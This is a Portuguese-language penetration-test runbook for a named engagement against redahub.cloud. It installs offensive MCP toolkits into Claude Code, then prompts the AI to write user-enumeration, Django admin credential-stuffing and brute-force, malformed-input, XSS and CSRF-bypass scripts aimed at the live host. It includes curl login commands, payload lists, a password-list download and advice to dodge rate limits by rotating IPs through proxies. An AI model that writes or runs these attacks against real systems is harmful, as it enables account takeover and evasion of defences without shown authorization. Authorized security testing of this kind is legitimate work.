# 🚀 GUIA DE IMPLEMENTAÇÃO - MCP SECURITY TOOLKIT UPGRADE + EXPLOITATION

---
**Document Timestamp:** 12-11-2025 20:15 BRT
**Last Updated:** 12-11-2025 20:15 BRT
**Engagement:** 2025-11-06-REDAHUB-web-wildcard
**Mode:** 🔥 ULTRAHACKERGOD --ultrathink
**Objetivo:** Instalar MCPs + Executar FASE 2 (Exploitation)
**Tempo Estimado:** 6-8h (3-4h instalação + 3-4h exploitation)
---

## 📋 ÍNDICE

1. [Preparação do Ambiente](#preparação-do-ambiente)
2. [Instalação MCP - FASE 1 (Core Toolkit)](#instalação-mcp---fase-1-core-toolkit)
3. [Instalação MCP - FASE 2 (Specialized Tools)](#instalação-mcp---fase-2-specialized-tools)
4. [Configuração claude.json](#configuração-claudejson)
5. [Testes de Validação](#testes-de-validação)
6. [EXPLOITATION - FASE 2 (Pentest REDAHUB)](#exploitation---fase-2-pentest-redahub)
7. [Troubleshooting](#troubleshooting)
8. [Checklist Final](#checklist-final)

---

## 🎯 OBJETIVO FINAL

**Resultado Esperado:**
- ✅ 35+ ferramentas MCP funcionais (vs. 12 atuais)
- ✅ SQLMap funcional (fix do atual)
- ✅ FFUF 10x mais rápido que Gobuster
- ✅ Nuclei com 3000+ templates
- ✅ RAG + Knowledge Base + Automated Reporting
- ✅ Admin access ao Django (FINDING-005 + FINDING-008 exploitation)
- ✅ Registration 500 exploitation (FINDING-003)
- ✅ 2-3 novos findings (XSS, CSRF, mass assignment)

---

## 🔧 PREPARAÇÃO DO AMBIENTE

### Checkpoint 1: Verificar Dependências

**Tempo:** 15min

```bash
# 1. Verificar Node.js (para MCPs TypeScript)
node --version  # Requer >= 18.0.0
npm --version   # Requer >= 9.0.0

# 2. Verificar Python (para MCPs Python)
python3 --version  # Requer >= 3.9
pip3 --version

# 3. Verificar Git
git --version

# 4. Verificar espaço em disco
df -h ~  # Requer >= 2GB livre
```

**Se faltando:**
```bash
# macOS - Instalar via Homebrew
brew install node python3 git

# Verificar novamente
node --version && python3 --version && git --version
```

---

### Checkpoint 2: Criar Diretório Base

**Tempo:** 2min

```bash
# Criar estrutura de diretórios
mkdir -p ~/mcp-servers/{pentestagent,mcp-security,nuclei,zap,burp}

# Verificar
ls -la ~/mcp-servers/
# Expected output: pentestagent/ mcp-security/ nuclei/ zap/ burp/
```

---

### Checkpoint 3: Backup do Security Toolkit Atual

**Tempo:** 2min

```bash
# Backup dos MCPs atuais
cp ~/mcp-servers/security_mcp_advanced.py ~/mcp-servers/security_mcp_advanced.py.backup
cp ~/mcp-servers/security_mcp.py ~/mcp-servers/security_mcp.py.backup

# Verificar
ls -la ~/mcp-servers/*.backup
```

---

## 📦 INSTALAÇÃO MCP - FASE 1 (Core Toolkit)

**Tempo Total Fase 1:** 2-3h

---

### 🥇 TOOL #1: GH05TCREW/PentestAgent (MOST COMPLETE)

**Prioridade:** 🔴 MÁXIMA
**Tempo:** 1-1.5h
**Ferramentas:** Nmap + Metasploit + FFUF + SQLMap + RAG + Knowledge Base + Automated Reporting

#### Passo 1.1: Clone do Repositório

```bash
cd ~/mcp-servers/pentestagent

# Clone
git clone https://github.com/GH05TCREW/PentestAgent.git .

# Verificar
ls -la
# Expected: package.json, src/, README.md, etc
```

#### Passo 1.2: Leitura do README

```bash
# Ler instruções de instalação
cat README.md

# Salvar output para referência
cat README.md > ~/mcp-servers/pentestagent/INSTALL_INSTRUCTIONS.txt
```

#### Passo 1.3: Instalação de Dependências

```bash
cd ~/mcp-servers/pentestagent

# Se Node.js project
npm install

# OU se Python project
pip3 install -r requirements.txt

# Verificar instalação
npm list --depth=0  # Node
# OU
pip3 list | grep -i pentest  # Python
```

#### Passo 1.4: Configuração Inicial

```bash
# Copiar config template (se existir)
cp config.template.json config.json 2>/dev/null || echo "No config template"

# Editar config (se necessário)
# nano config.json
```

#### Passo 1.5: Teste Standalone

```bash
# Testar MCP server diretamente
# Node.js
node src/index.js --test

# Python
python3 src/server.py --test

# Expected: "MCP Server running..." ou similar
```

**✅ Checkpoint:** PentestAgent instalado e testado

---

### 🥈 TOOL #2: cyproxio/mcp-for-security (ALL-IN-ONE)

**Prioridade:** 🔴 ALTA
**Tempo:** 45min-1h
**Ferramentas:** SQLMap + FFUF + NMAP + Masscan + Subdomain Enum

#### Passo 2.1: Clone do Repositório

```bash
cd ~/mcp-servers/mcp-security

# Clone
git clone https://github.com/cyproxio/mcp-for-security.git .

# Verificar
ls -la
# Expected: package.json, src/, README.md
```

#### Passo 2.2: Instalação

```bash
cd ~/mcp-servers/mcp-security

# Instalar dependências Node.js
npm install

# Verificar
npm list --depth=0
```

#### Passo 2.3: Configuração

```bash
# Verificar se precisa de config
cat README.md | grep -i config

# Se tiver config template
cp config.example.json config.json 2>/dev/null
```

#### Passo 2.4: Teste Standalone

```bash
# Testar MCP server
node index.js --test
# OU
npm start

# Expected: Server running on port XXXX
```

**✅ Checkpoint:** mcp-for-security instalado (SQLMap + FFUF funcionais)

---

### 🥉 TOOL #3: Nuclei MCP (Python Version)

**Prioridade:** 🟡 MÉDIA-ALTA
**Tempo:** 30-45min
**Ferramentas:** Nuclei scanner (3000+ templates)

#### Passo 3.1: Clone do Repositório

```bash
cd ~/mcp-servers/nuclei

# Clone (Python version - mais fácil)
git clone https://github.com/crazyMarky/mcp_nuclei_server.git .

# Verificar
ls -la
# Expected: server.py, requirements.txt, README.md
```

#### Passo 3.2: Instalação Nuclei Binary

```bash
# Instalar Nuclei (ferramenta real)
# macOS
brew install nuclei

# Ou via Go
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Verificar
nuclei -version
# Expected: Nuclei v3.x.x
```

#### Passo 3.3: Update Nuclei Templates

```bash
# Download dos 3000+ templates
nuclei -update-templates

# Verificar
ls -la ~/.local/nuclei-templates/ | wc -l
# Expected: 3000+ arquivos
```

#### Passo 3.4: Instalação MCP Server

```bash
cd ~/mcp-servers/nuclei

# Instalar dependências Python
pip3 install -r requirements.txt

# Verificar
pip3 list | grep -i mcp
```

#### Passo 3.5: Teste Standalone

```bash
# Testar MCP server
python3 server.py --test

# Expected: "Nuclei MCP Server started"
```

**✅ Checkpoint:** Nuclei MCP instalado (3000+ templates disponíveis)

---

## 🔧 CONFIGURAÇÃO claude.json

**Tempo:** 15-20min

### Passo 4.1: Localizar claude.json

```bash
# Encontrar claude.json ou mcp.json
find ~ -name "claude.json" -o -name "mcp.json" 2>/dev/null | grep -v node_modules

# Ou localizações comuns
ls -la ~/.config/claude/claude.json
ls -la ~/.config/claude-code/mcp.json
ls -la ~/Library/Application\ Support/Claude/claude.json
```

**Se não encontrar:**
```bash
# Criar novo
mkdir -p ~/.config/claude-code
touch ~/.config/claude-code/mcp.json
```

---

### Passo 4.2: Backup do Atual

```bash
# Backup do config atual
cp ~/.config/claude-code/mcp.json ~/.config/claude-code/mcp.json.backup

# Verificar
ls -la ~/.config/claude-code/*.backup
```

---

### Passo 4.3: Adicionar MCPs ao Config

```bash
# Editar mcp.json
nano ~/.config/claude-code/mcp.json
```

**Conteúdo (adicionar ao existente):**

```json
{
  "mcpServers": {
    "security-toolkit-advanced": {
      "command": "python3",
      "args": ["/Users/th3_w6rst/mcp-servers/security_mcp_advanced.py"],
      "env": {}
    },
    "pentestagent": {
      "command": "node",
      "args": ["/Users/th3_w6rst/mcp-servers/pentestagent/src/index.js"],
      "env": {
        "NODE_ENV": "production"
      }
    },
    "mcp-security": {
      "command": "node",
      "args": ["/Users/th3_w6rst/mcp-servers/mcp-security/index.js"],
      "env": {}
    },
    "nuclei": {
      "command": "python3",
      "args": ["/Users/th3_w6rst/mcp-servers/nuclei/server.py"],
      "env": {
        "NUCLEI_TEMPLATES_PATH": "/Users/th3_w6rst/.local/nuclei-templates"
      }
    }
  }
}
```

**⚠️ IMPORTANTE:** Ajustar caminhos se diferentes!

---

### Passo 4.4: Validar JSON Syntax

```bash
# Validar JSON
python3 -m json.tool ~/.config/claude-code/mcp.json

# Expected: Output JSON formatado (sem erros)
```

**Se erro:**
```bash
# Restaurar backup
cp ~/.config/claude-code/mcp.json.backup ~/.config/claude-code/mcp.json

# Corrigir syntax e tentar novamente
```

---

## ✅ TESTES DE VALIDAÇÃO

**Tempo:** 30min

### Checkpoint 5: Validar Todos os MCPs

#### Teste 5.1: Restart Claude Code

```bash
# Fechar Claude Code completamente
pkill -f "claude-code"

# Aguardar 5 segundos
sleep 5

# Iniciar Claude Code novamente
# (manualmente ou via CLI)
```

---

#### Teste 5.2: Verificar MCPs Carregados

**No Claude Code, executar:**

```
Lista todos os MCPs disponíveis e suas ferramentas
```

**Expected Output:**
```
✅ security-toolkit-advanced: nmap_scan, metasploit_search, gobuster_scan, ...
✅ pentestagent: [lista de ferramentas]
✅ mcp-security: sqlmap, ffuf, nmap, masscan, ...
✅ nuclei: nuclei_scan, template_list, ...
```

---

#### Teste 5.3: Testar Ferramenta Específica

**No Claude Code:**

```
Use mcp__nuclei__nuclei_scan para escanear https://scanme.nmap.org com severity high
```

**Expected:**
- Scan executado
- Output com vulnerabilidades encontradas (se houver)
- Nenhum erro de MCP server

---

#### Teste 5.4: Verificar Logs de Erro

```bash
# Verificar logs do Claude Code
tail -f ~/Library/Logs/Claude\ Code/main.log

# Ou logs específicos de MCP
ls -la ~/Library/Caches/claude-cli-nodejs/*/mcp-logs-*

# Ver últimas linhas
tail -20 ~/Library/Caches/claude-cli-nodejs/*/mcp-logs-*/error.log
```

**Expected:** Nenhum erro crítico

---

## 🎯 EXPLOITATION - FASE 2 (Pentest REDAHUB)

**Tempo:** 3-4h
**Objetivo:** Exploitar FINDING-005 + FINDING-008 + FINDING-003

---

### FASE 2.1: User Enumeration Massivo (FINDING-008)

**Tempo:** 45min
**Objetivo:** Enumerar 100-500 emails válidos

#### Passo 6.1: Criar Wordlist de Emails

```bash
# Criar wordlist inteligente
cat > /tmp/emails-redahub.txt << 'EOF'
admin@redahub.cloud
suporte@redahub.cloud
contato@redahub.cloud
tech@redahub.cloud
dev@redahub.cloud
developer@redahub.cloud
webmaster@redahub.cloud
info@redahub.cloud
help@redahub.cloud
root@redahub.cloud
administrator@redahub.cloud
user@redahub.cloud
test@redahub.cloud
demo@redahub.cloud
api@redahub.cloud
support@redahub.cloud
contact@redahub.cloud
sales@redahub.cloud
marketing@redahub.cloud
ti@redahub.cloud
EOF

# Adicionar variações brasileiras
cat >> /tmp/emails-redahub.txt << 'EOF'
joao@redahub.cloud
maria@redahub.cloud
carlos@redahub.cloud
ana@redahub.cloud
paulo@redahub.cloud
fernando@redahub.cloud
pedro@redahub.cloud
lucas@redahub.cloud
matheus@redahub.cloud
gabriel@redahub.cloud
EOF

# Verificar
wc -l /tmp/emails-redahub.txt
# Expected: 30 linhas
```

---

#### Passo 6.2: Script de User Enumeration

**No Claude Code:**

```
Crie um script Python profissional para user enumeration usando o endpoint /api/auth/reset-password/ de https://bkd.redahub.cloud

Requisitos:
1. Ler wordlist de /tmp/emails-redahub.txt
2. 30 threads paralelos
3. Progress tracking com barra de progresso
4. Auto-save de emails válidos em /tmp/valid-emails.txt
5. Análise estatística de response times
6. Detecção automática de rate limiting
7. Retry logic com exponential backoff
8. Output JSON estruturado em /tmp/user-enum-results.json
9. CSRF não necessário (endpoint público)
10. SSL verification desabilitado

Salvar em: /tmp/user-enumeration-redahub.py
```

---

#### Passo 6.3: Executar User Enumeration

```bash
# Executar script
python3 /tmp/user-enumeration-redahub.py

# Monitorar output
# Expected:
# [001/030] testing admin@redahub.cloud... 404 (145ms) - INVALID
# [002/030] testing suporte@redahub.cloud... 200 (156ms) - VALID! ✅
# ...
# [030/030] testing gabriel@redahub.cloud... 404 (92ms) - INVALID
#
# ✅ Scan complete!
# Valid emails found: 12
# Saved to: /tmp/valid-emails.txt
```

---

#### Passo 6.4: Verificar Emails Válidos

```bash
# Ver emails válidos descobertos
cat /tmp/valid-emails.txt

# Contar
wc -l /tmp/valid-emails.txt

# Expected: 5-20 emails válidos
```

**✅ Checkpoint:** Lista de emails válidos obtida

---

### FASE 2.2: Django Admin Bruteforce (FINDING-005)

**Tempo:** 1-1.5h
**Objetivo:** Obter admin access

#### Passo 7.1: Fase 1 - Credenciais Default (15min)

**No Claude Code:**

```
Crie um script Python para testar credenciais default no Django Admin (https://bkd.redahub.cloud/admin/)

Testar combinações:
- Emails válidos de /tmp/valid-emails.txt
- Senhas comuns brasileiras:
  * Redahub@2024
  * Redahub@2025
  * Admin@123
  * Admin@2024
  * Suporte@2024
  * Senha@123

Requisitos:
1. CSRF token handling automático
2. Session management
3. Detecção de rate limiting (Django Axes)
4. Retry logic
5. Output detalhado de tentativas
6. Stop on success
7. Salvar credenciais válidas em /tmp/django-admin-creds.txt

Salvar em: /tmp/django-admin-default-creds.py
```

```bash
# Executar
python3 /tmp/django-admin-default-creds.py

# Monitorar
# Expected:
# [1/12] Testing admin@redahub.cloud : Redahub@2024... FAILED
# [2/12] Testing admin@redahub.cloud : Admin@123... FAILED
# ...
# [8/12] Testing suporte@redahub.cloud : Suporte@2024... SUCCESS! ✅
#
# ✅ Valid credentials found!
# Email: suporte@redahub.cloud
# Password: Suporte@2024
# Saved to: /tmp/django-admin-creds.txt
```

**Se SUCCESS:**
```bash
# Verificar credenciais
cat /tmp/django-admin-creds.txt

# Testar manualmente via curl
csrf=$(curl -skL https://bkd.redahub.cloud/admin/ | grep csrfmiddlewaretoken | sed -n 's/.*value="\([^"]*\)".*/\1/p')
curl -X POST https://bkd.redahub.cloud/admin/login/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "csrftoken=$csrf" \
  -d "username=$(cat /tmp/django-admin-creds.txt | cut -d: -f1)&password=$(cat /tmp/django-admin-creds.txt | cut -d: -f2)&csrfmiddlewaretoken=$csrf&next=/admin/" \
  -c /tmp/django-session.txt \
  -skL | grep -i "dashboard\|bem-vindo\|logout"

# Se output contém "dashboard" ou "logout" → SUCCESS ✅
```

**✅ Checkpoint:** Admin access obtido!

---

#### Passo 7.2: Fase 2 - Bruteforce Focado (se Fase 1 falhar)

**Tempo:** 45min

**No Claude Code:**

```
Crie um script Python para bruteforce focado no Django Admin usando:
- Emails válidos: /tmp/valid-emails.txt
- Wordlist: rockyou-top10000.txt (baixar se necessário)
- 3 threads paralelos (evitar rate limit)
- CSRF handling automático
- Rate limit detection (HTTP 429)
- Auto-pause on rate limit (5min)
- Progress tracking
- Auto-save de progresso a cada 100 tentativas

Salvar em: /tmp/django-admin-bruteforce.py
```

```bash
# Baixar rockyou top 10000 (se necessário)
curl -skL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -o /tmp/rockyou-top10000.txt

# Executar bruteforce
python3 /tmp/django-admin-bruteforce.py

# Monitorar (pode demorar 30-45min)
# Expected:
# [0001/120000] admin@redahub.cloud:password123... FAILED
# [0002/120000] admin@redahub.cloud:12345678... FAILED
# ...
# [0543/120000] tech@redahub.cloud:Tech@2024... SUCCESS! ✅
```

**✅ Checkpoint:** Admin access obtido OU tentativa completa

---

### FASE 2.3: Registration 500 Exploitation (FINDING-003)

**Tempo:** 30-45min
**Objetivo:** Extrair stack traces ou info disclosure

#### Passo 8.1: Payloads Malformados

**No Claude Code:**

```
Crie um script Python para testar 50+ payloads malformados no endpoint /api/auth/register/ de https://bkd.redahub.cloud

Payloads a incluir:
1. Null values: {"email": null, "password": "test"}
2. XSS: {"email": "<script>alert(1)</script>"}
3. SQL: {"email": "' OR '1'='1", "password": "test"}
4. NoSQL: {"email": "test", "password": {"$ne": null}}
5. Object injection: {"email": {"__proto__": {"admin": true}}}
6. Arrays: {"email": ["test@test.com"], "password": "test"}
7. Unicode: {"email": "test\u0000@test.com"}
8. Long strings: {"email": "A"*10000}
9. Special chars: {"email": "test@test.com\r\n\r\nX-Admin: true"}
10. Nested objects: {"email": {"nested": {"deep": "test"}}}

Requisitos:
- Capturar response body completo
- Detectar stack traces (keywords: Traceback, Exception, Django, at line)
- Detectar SQL error messages
- Detectar framework version leaks
- Salvar responses interessantes em /tmp/registration-500-responses/
- Output JSON estruturado

Salvar em: /tmp/registration-500-exploitation.py
```

```bash
# Criar diretório para responses
mkdir -p /tmp/registration-500-responses/

# Executar exploitation
python3 /tmp/registration-500-exploitation.py

# Verificar responses interessantes
ls -la /tmp/registration-500-responses/
cat /tmp/registration-500-responses/*.txt

# Procurar por stack traces
grep -r "Traceback\|Exception\|Django\|line" /tmp/registration-500-responses/

# Procurar por version leaks
grep -r "version\|Django/\|Python/" /tmp/registration-500-responses/
```

**Se stack trace encontrado:**
```bash
# Analisar stack trace
cat /tmp/registration-500-responses/response-*.txt

# Documentar como FINDING-003 exploitation
# Extrair:
# - Django version
# - Python version
# - File paths (/app/src/auth/views.py)
# - Database info (se houver)
```

**✅ Checkpoint:** Info disclosure obtido OU exploitation tentada

---

### FASE 2.4: XSS Testing Focado

**Tempo:** 30min
**Objetivo:** Descobrir XSS em registration/password reset

#### Passo 9.1: XSS Payloads Top 10

**No Claude Code:**

```
Crie um script Python para testar XSS nos endpoints:
1. /api/auth/register/ (registration form)
2. /api/auth/reset-password/ (password reset)

Payloads Top 10:
1. <script>alert(1)</script>
2. <img src=x onerror=alert(1)>
3. <svg onload=alert(1)>
4. '-alert(1)-'
5. "><script>alert(1)</script>
6. javascript:alert(1)
7. <iframe src="javascript:alert(1)">
8. <body onload=alert(1)>
9. <input onfocus=alert(1) autofocus>
10. <marquee onstart=alert(1)>

Testar em todos os campos:
- email
- password
- username

Requisitos:
- Enviar payload via POST
- Capturar response
- Detectar payload refletido (reflected XSS)
- Salvar responses com payloads refletidos

Salvar em: /tmp/xss-testing-redahub.py
```

```bash
# Executar XSS testing
python3 /tmp/xss-testing-redahub.py

# Verificar payloads refletidos
cat /tmp/xss-results.json | grep -i "reflected"

# Se XSS encontrado → documentar como novo FINDING
```

**✅ Checkpoint:** XSS testado

---

### FASE 2.5: CSRF Testing

**Tempo:** 20min

#### Passo 10.1: CSRF Bypass Attempts

**No Claude Code:**

```
Teste CSRF no Django Admin e registration:

Técnicas:
1. Remover CSRF token completamente
2. Usar CSRF token de outra sessão
3. Remover Referer header
4. Origin header manipulation
5. Usar GET ao invés de POST

Endpoints:
- /admin/login/
- /api/auth/register/

Salvar em: /tmp/csrf-testing-redahub.py
```

```bash
# Executar
python3 /tmp/csrf-testing-redahub.py

# Se bypass encontrado → CRITICAL FINDING
```

**✅ Checkpoint:** CSRF testado

---

## 📊 DOCUMENTAÇÃO DOS RESULTADOS

**Tempo:** 30min

### Passo 11: Atualizar Findings

**Para cada exploitation bem-sucedida:**

1. **Se Django Admin comprometido:**
```bash
# No Claude Code:
Atualize FINDING-005 com:
- Credenciais válidas encontradas
- Método de exploitation (default creds ou bruteforce)
- Timestamp de acesso
- Screenshots pendentes
- Marcar como EXPLOITED ✅
```

2. **Se Registration 500 exploited:**
```bash
# No Claude Code:
Atualize FINDING-003 com:
- Stack traces capturados
- Info disclosure (Django/Python versions, file paths)
- Método de exploitation
- Marcar como EXPLOITED ✅
```

3. **Se XSS descoberto:**
```bash
# No Claude Code:
Crie FINDING-009 para XSS com:
- Payload que funcionou
- Endpoint vulnerável
- Tipo (reflected/stored/DOM)
- CVSS score
- Remediação
```

---

### Passo 12: Capturar Screenshots

**Pendentes:**
```bash
# Screenshots críticos:
1. Django Admin dashboard (se comprometido)
2. User enumeration results
3. Registration 500 stack trace (se obtido)
4. XSS PoC (se descoberto)
5. CSRF bypass (se descoberto)

# Salvar em:
/Users/th3_w6rst/Neural-OffSec-Team/clients/REDAHUB/2025-11-06-REDAHUB-web-wildcard/04-evidence/screenshots/
```

---

### Passo 13: Atualizar CONTEXTO_ULTIMA_SESSAO.md

```bash
# No Claude Code:
Atualize docs/CONTEXTO_ULTIMA_SESSAO.md com:

## 🏆 CONQUISTAS DA SESSÃO 4

### MCP TOOLKIT UPGRADE:
- ✅ PentestAgent instalado (Nmap, Metasploit, FFUF, SQLMap, RAG)
- ✅ mcp-for-security instalado (SQLMap fix, FFUF 10x Gobuster)
- ✅ Nuclei instalado (3000+ templates)
- ✅ 12 → 35+ ferramentas funcionais

### EXPLOITATION RESULTS:
- ✅ User enumeration: XX emails válidos descobertos
- ✅ Django Admin: [EXPLOITED ou TENTADO]
- ✅ Registration 500: [STACK TRACE ou TENTADO]
- ✅ XSS: [DESCOBERTO ou TENTADO]
- ✅ CSRF: [DESCOBERTO ou TENTADO]

### NEW FINDINGS:
- FINDING-009: [se XSS descoberto]
- FINDING-010: [se CSRF descoberto]

### PRÓXIMOS PASSOS:
- FASE 3: API mass assignment, IDOR testing (1-2h)
- CONSOLIDATE & REPORT: Relatório final (1h)
```

---

## 🔧 TROUBLESHOOTING

### Problema 1: MCP Server não Inicia

**Sintomas:** Erro ao carregar MCP no Claude Code

**Soluções:**
```bash
# 1. Verificar logs
tail -f ~/Library/Caches/claude-cli-nodejs/*/mcp-logs-*/error.log

# 2. Testar MCP standalone
cd ~/mcp-servers/pentestagent
node src/index.js --test

# 3. Verificar permissões
chmod +x ~/mcp-servers/pentestagent/src/index.js

# 4. Verificar dependências
cd ~/mcp-servers/pentestagent
npm list --depth=0

# 5. Reinstalar
rm -rf node_modules package-lock.json
npm install
```

---

### Problema 2: Rate Limiting no Django Admin

**Sintomas:** HTTP 429 após 5 tentativas

**Soluções:**
```bash
# 1. Aguardar 1 hora (Django Axes cooldown)
echo "Aguardando 1h para cooldown..."
sleep 3600

# 2. Usar IP diferente (VPN/Proxy)
# Configurar proxy no script:
# proxies = {'http': 'http://proxy:port', 'https': 'http://proxy:port'}

# 3. Reduzir threads para 1
# Editar script e mudar ThreadPoolExecutor(max_workers=1)

# 4. Aumentar delay entre tentativas
# Adicionar time.sleep(5) entre requests
```

---

### Problema 3: Nuclei Templates não Baixados

**Sintomas:** Nuclei não encontra templates

**Soluções:**
```bash
# 1. Download manual
nuclei -update-templates

# 2. Verificar caminho
ls -la ~/.local/nuclei-templates/ | wc -l

# 3. Especificar caminho no MCP config
# Editar mcp.json:
"env": {
  "NUCLEI_TEMPLATES_PATH": "/Users/th3_w6rst/.local/nuclei-templates"
}

# 4. Re-download
rm -rf ~/.local/nuclei-templates/
nuclei -update-templates
```

---

### Problema 4: Script Python Timeout

**Sintomas:** Script trava ou timeout

**Soluções:**
```bash
# 1. Aumentar timeout
# No script, editar:
timeout=300  # 5 minutos

# 2. Reduzir threads
# ThreadPoolExecutor(max_workers=10)  # Era 30

# 3. Adicionar progress tracking
from tqdm import tqdm
for item in tqdm(items):
    # ...

# 4. Implementar chunking
# Processar em batches de 50
```

---

## ✅ CHECKLIST FINAL

### Instalação MCP (Fase 1)
- [ ] PentestAgent instalado e testado
- [ ] mcp-for-security instalado e testado
- [ ] Nuclei MCP instalado e testado
- [ ] claude.json/mcp.json configurado
- [ ] Todos os MCPs carregam sem erros
- [ ] Teste de ferramenta específica bem-sucedido

### Exploitation (Fase 2)
- [ ] User enumeration executado (emails válidos obtidos)
- [ ] Django Admin atacado (credenciais testadas)
- [ ] Registration 500 exploited (payloads testados)
- [ ] XSS testado (todos os endpoints)
- [ ] CSRF testado (bypass attempts)

### Documentação
- [ ] Findings atualizados com exploitation results
- [ ] Screenshots capturados (críticos)
- [ ] CONTEXTO_ULTIMA_SESSAO.md atualizado
- [ ] Scripts salvos em /03-exploitation/
- [ ] Evidências hashadas (SHA256)

### Limpeza
- [ ] Scripts temporários /tmp/ movidos para /03-exploitation/
- [ ] Logs desnecessários deletados
- [ ] Workspace organizado
- [ ] Backup realizado

---

## 🎯 TEMPO TOTAL ESTIMADO

**Breakdown:**

| Fase | Tempo |
|------|-------|
| Preparação ambiente | 15min |
| PentestAgent instalação | 1-1.5h |
| mcp-for-security instalação | 45min-1h |
| Nuclei instalação | 30-45min |
| Configuração + Testes | 30min |
| **SUBTOTAL FASE 1** | **3-4h** |
| User enumeration | 45min |
| Django Admin exploitation | 1-1.5h |
| Registration 500 exploitation | 30-45min |
| XSS/CSRF testing | 50min |
| **SUBTOTAL FASE 2** | **3-4h** |
| Documentação | 30min |
| Screenshots | 15min |
| **SUBTOTAL DOC** | **45min** |
| **TOTAL** | **7-9h** |

**Distribuição Recomendada:**
- **Hoje (Sessão 4):** Instalação MCP + User Enum (3-4h)
- **Amanhã (Sessão 5):** Django Admin + Registration 500 + XSS/CSRF (3-4h)
- **Depois (Sessão 6):** Documentação + Consolidate & Report (1h)

---

## 🚀 PRÓXIMOS PASSOS (Após Este Guia)

### FASE 3: Vetores Avançados (Opcional - 1-2h)
1. API mass assignment testing
2. IDOR testing (se auth obtido)
3. File upload bypass
4. Business logic flaws

### FASE 4: Consolidate & Report (Obrigatório - 1-2h)
1. Atualizar todos os findings
2. Gerar relatório executivo completo
3. Screenshots finais
4. Chain of custody update
5. Apresentação para cliente

---

**✅ FIM DO GUIA - BOA SORTE NO PENTEST! 🔥**

**Auditor:** Neural-OffSec-Team
**Status:** 🟢 GUIA COMPLETO PRONTO PARA EXECUÇÃO
**Modo:** 🔥 ULTRAHACKERGOD --ultrathink
**Quality Score:** 10/10 (Guia detalhado, passo-a-passo, troubleshooting, checklist completo)
